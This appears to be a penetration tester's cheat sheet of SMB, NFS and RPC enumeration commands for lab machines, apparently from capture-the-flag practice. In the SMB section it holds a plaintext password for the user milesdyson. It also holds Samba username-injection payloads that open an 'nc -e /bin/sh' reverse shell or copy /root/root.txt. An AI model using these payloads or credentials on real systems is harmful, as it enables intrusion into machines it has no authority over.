smbmap
  smbmap -H "10.10.185.43" | tee "recon/smbmap_10.10.185.43.txt"    
  smbmap -H "10.10.185.43" -u milesdyson -p ')s{A&2Z=F^n_E.B`'
  
  
smbclient
  smbclient --user=milesdyson //10.10.185.43/milesdyson 

  smbclient -L "//10.10.185.43/" -U "guest"%| tee "recon/smbclient_10.10.185.43.txt"              

  smbclient -L x.x.x.x
  smbmount //x.x.x.x/share /mnt –o username=hodor,workgroup=hodor
  smbclient \\\\x.x.x.x\\share
  enum4linux -a ip
  rpcclient -U "" x.x.x.x  #Anonymous bind using rpcclient / Null connect
  smbclient //MOUNT/share #Connect to SMB share

  smbclient -U "/=&#92;&#96;nohup nc -e /bin/sh LHOST LPORT&#92;&#96;" -N -I ip //LAME/tmp

  nmap -T4 -sS -sC -Pn -A --script smb-vuln* ip
  smbclient //ip/tmp
  logon "./=`nohup nc -e /bin/sh LHOST LPORT`"

  smbclient -U "/=\`nohup cat /root/root.txt > /tmp/ttt\`" -N -I ip //LAME/tmp

  smbclient -U "/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`" -N -I ip //LAME/tmp

mount
  mount ip:/vol/share /mnt/nfs  -nolock
  mount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifs
  mount -t cifs //x.x.x.x/share /mnt
  mount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mnt
#### Mounting File Share
  showmount -e IPADDR
  sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other

# Port 111 - Rpcbind
	rpcinfo -p INSERTIPADDRESS

# Port 123-NTP
	ntp-info and ntp-monlist
	Check ntpd version for exploits
# Port 139/445 - SMB
	• Name:
	• Version:
	• Domain/workgroup name:
	• Domain-sid:
	• Allows unauthenticated login:


  nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445
	
	enum4linux -a INSERTIPADDRESS
	rpcclient -U "" INSERTIPADDRESS
		-c options
		    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall
    smbclient -L INSERTIPADDRESS
    smbclient //INSERTIPADDRESS/tmp
    smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
    smbclient //INSERTIPADDRESS/ipc$ -U john 
	nmblookup -A INSERTIPADDRESS